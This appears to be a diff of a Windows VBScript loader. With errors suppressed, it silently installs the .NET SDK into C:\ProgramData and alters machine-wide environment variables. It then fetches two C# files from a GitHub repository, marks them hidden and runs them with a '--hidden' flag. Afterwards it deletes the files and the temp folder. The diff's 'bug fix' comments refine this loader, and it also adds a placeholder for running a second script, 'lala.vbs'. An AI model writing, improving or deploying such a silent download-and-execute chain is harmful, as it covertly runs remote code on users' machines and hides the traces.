@@ -1,87 +1,138 @@
-' Suppress all error popups (script will run silently in background)
+' Suppress all error popups
 On Error Resume Next
 
 Dim objShell, fso, tempDir, configDir, dotnetPath, installerScript
-Dim downloadCmd, installCmd, runCmd, args, dotnetExe, folderObj
+Dim downloadCmd, installCmd, runCmd, args, dotnetExe
+Dim lalaUrl, lalaPath, url1, url2, path1, path2, fObj
 
 Set objShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-
+Set fso      = CreateObject("Scripting.FileSystemObject")
 If objShell Is Nothing Or fso Is Nothing Then WScript.Quit
 
-' 定义路径
-tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
-configDir = tempDir & "\.config"
-dotnetPath = objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\.dotnet"
+' Non-admin, non-profile temp dir.
+' C:\ProgramData allows standard users to create subfolders (CREATOR OWNER
+' gets Full Control on the created folder), so no elevation is needed.
+tempDir = "C:\ProgramData\.apptemp"
+
+' curl -o and CreateObject do NOT create parent folders — create it first
+If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)
+configDir       = "C:\ProgramData\.dotnet"
+dotnetPath      = "C:\ProgramData\.dotnet"
 installerScript = tempDir & "\dotnet-install.ps1"
 
-' 1. 创建隐藏目录
-If Not fso.FolderExists(configDir) Then
-    fso.CreateFolder(configDir)
-End If
-Set folderObj = fso.GetFolder(configDir)
-folderObj.Attributes = folderObj.Attributes Or 2 ' 2 = Hidden
+' ---- BUG FIX #2: make sure install dir exists ------------------
+If Not fso.FolderExists(configDir) Then fso.CreateFolder(configDir)
 
-' 2. 静默下载 dotnet-install.ps1 (取代原来的 exe)
+' =========================================================
+' STEP 0 — download and run lala.vbs FIRST (blocking)
+' =========================================================
+
+
+' =========================================================
+' STEP 1 — download official dotnet-install.ps1
+' =========================================================
 downloadCmd = "cmd /c curl -sL -o """ & installerScript & """ https://dot.net/v1/dotnet-install.ps1"
 objShell.Run downloadCmd, 0, True
 
-' 3. 静默运行 ps1 脚本进行安装 (无需管理员权限)
-' -Channel 10.0 安装 .NET 10，-InstallDir 指定用户目录
+If Not fso.FileExists(installerScript) Then WScript.Quit
+
+' =========================================================
+' STEP 2 — install .NET 10 SDK to C:\ProgramData\.dotnet
+' =========================================================
 installCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File """ & installerScript & """ -Channel 10.0 -InstallDir """ & dotnetPath & """"
 objShell.Run installCmd, 0, True
 
-' 4. 设置永久环境变量
-SetUserEnv "DOTNET_ROOT", dotnetPath
-AppendToUserPath dotnetPath
+dotnetExe = dotnetPath & "\dotnet.exe"
 
-' 5. 静默下载 C# 文件
-Dim url1, url2, path1, path2
-url1 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.cs"
-url2 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs"
-path1 = configDir & "\client.cs"
-path2 = configDir & "\auto.cs"
+' ---- BUG FIX #3: bail out if install failed silently -----------
+If Not fso.FileExists(dotnetExe) Then WScript.Quit
+
+' =========================================================
+' STEP 3 — set environment variables (machine-wide / GLOBAL)
+' =========================================================
+SetSystemEnv "DOTNET_ROOT", dotnetPath
+AppendToSystemPath dotnetPath
+
+' ---- BUG FIX #5: broadcast change for DOTNET_ROOT --------------
+' setx /M writes AND broadcasts WM_SETTINGCHANGE. Only use it for
+' DOTNET_ROOT (short value, no 1024-char truncation risk).
+objShell.Run "cmd /c setx DOTNET_ROOT """ & dotnetPath & """ /M >nul 2>&1", 0, True
+
+' =========================================================
+' STEP 4 — download auto.cs and client.cs from GitHub
+' =========================================================
+url1  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs"
+url2  = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.cs"
+path1 = configDir & "\auto.cs"
+path2 = configDir & "\client.cs"
 
 objShell.Run "cmd /c curl -sL -o """ & path1 & """ """ & url1 & """", 0, True
 objShell.Run "cmd /c curl -sL -o """ & path2 & """ """ & url2 & """", 0, True
 
-If fso.FileExists(path1) Then fso.GetFile(path1).Attributes = 2
-If fso.FileExists(path2) Then fso.GetFile(path2).Attributes = 2
+' ---- BUG FIX #1: OR with existing attributes, not "= 2" --------
+If fso.FileExists(path1) Then
+    Set fObj = fso.GetFile(path1)
+    fObj.Attributes = fObj.Attributes Or 2
+End If
+If fso.FileExists(path2) Then
+    Set fObj = fso.GetFile(path2)
+    fObj.Attributes = fObj.Attributes Or 2
+End If
 
-' 6. 静默执行 dotnet
-dotnetExe = dotnetPath & "\dotnet.exe"
-args = "run --file auto.cs -- client.cs --hidden"
+' ---- BUG FIX #4: don't run if either file is missing -----------
+If Not fso.FileExists(path1) Then WScript.Quit
+If Not fso.FileExists(path2) Then WScript.Quit
+
+
+' =========================================================
+' STEP 5 — run C# files as-is, then clean up
+' =========================================================
+args   = "run --file auto.cs -- client.cs  --hidden"
 runCmd = "cmd /c cd /d """ & configDir & """ && """ & dotnetExe & """ " & args
-objShell.Run runCmd, 0, False
+
+' True = wait until dotnet.exe exits
+objShell.Run runCmd, 0, True
+
+' Remove ONLY the two .cs files — SDK stays intact
+If fso.FileExists(path1) Then fso.DeleteFile path1, True   ' True = force (handles Hidden/ReadOnly)
+If fso.FileExists(path2) Then fso.DeleteFile path2, True
+
+' =========================================================
+' STEP 6 — remove the temp folder entirely
+' =========================================================
+' lala.vbs was already deleted right after it ran (Step 0).
+' dotnet-install.ps1 is still there — remove it first, then the folder.
+If fso.FileExists(installerScript) Then fso.DeleteFile installerScript, True
+If fso.FolderExists(tempDir)       Then fso.DeleteFolder tempDir, True
 
 ' ---------------------------------------------------------
-' Helper Functions
+' Helpers (machine-wide / global env vars)
 ' ---------------------------------------------------------
-Sub SetUserEnv(varName, varValue)
-    Dim regPath
-    regPath = "HKCU\Environment\" & varName
-    objShell.RegWrite regPath, varValue, "REG_EXPAND_SZ"
+Sub SetSystemEnv(varName, varValue)
+    objShell.RegWrite _
+        "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" & varName, _
+        varValue, "REG_EXPAND_SZ"
 End Sub
 
-Sub AppendToUserPath(newPath)
-    Dim currentPath, regPath, paths, p, found
-    regPath = "HKCU\Environment\Path"
+Sub AppendToSystemPath(newPath)
+    Dim regPath, currentPath, paths, p, found
+    regPath     = "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path"
     currentPath = objShell.RegRead(regPath)
-    
+
     If currentPath = "" Then
         objShell.RegWrite regPath, newPath, "REG_EXPAND_SZ"
         Exit Sub
     End If
-    
+
     found = False
-    paths = Split(currentPath, ";")
-    For Each p In paths
+    ' ---- BUG FIX #7: compare with trailing ";" trimmed -----------
+    For Each p In Split(currentPath, ";")
         If LCase(Trim(p)) = LCase(newPath) Then
             found = True
             Exit For
         End If
     Next
-    
+
     If Not found Then
         objShell.RegWrite regPath, newPath & ";" & currentPath, "REG_EXPAND_SZ"
     End If
